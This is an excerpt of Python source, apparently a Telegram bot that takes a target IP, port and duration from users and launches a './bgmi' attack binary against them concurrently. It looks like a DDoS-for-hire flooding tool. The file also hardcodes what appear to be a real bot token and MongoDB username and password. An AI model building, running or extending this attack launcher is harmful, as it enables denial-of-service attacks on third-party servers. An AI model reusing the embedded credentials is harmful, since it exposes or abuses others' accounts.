...
TOKEN = '7044901026:AAHxFNVMCXVoiyLCLN9JW5Rzlzw8zrPes'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -4268779123
CHANNEL_ID = -4268779123
error_channel_id = -4268779123
...
async def run_attack_command_on_codespace(user, target_ip, target_port, duration):
    command = f"./bgmi {user} {target_ip} {target_port} {duration}"
    try:
        ...
        if output:
            logging.info(f"Command output for {user}: {output}")
        if error:
            logging.error(f"Command error for {user}: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command for {user}: {e}")
    finally:
...
async def run_attack_command_async(user, target_ip, target_port, duration):
    await run_attack_command_on_codespace(user, target_ip, target_port, duration)
...
def process_attack_command(message):
    try:
        ...
        # Start the attack in a new asyncio task for concurrent execution
        asyncio.run_coroutine_threadsafe(run_attack_command_async(user, target_ip, target_port, duration), loop)
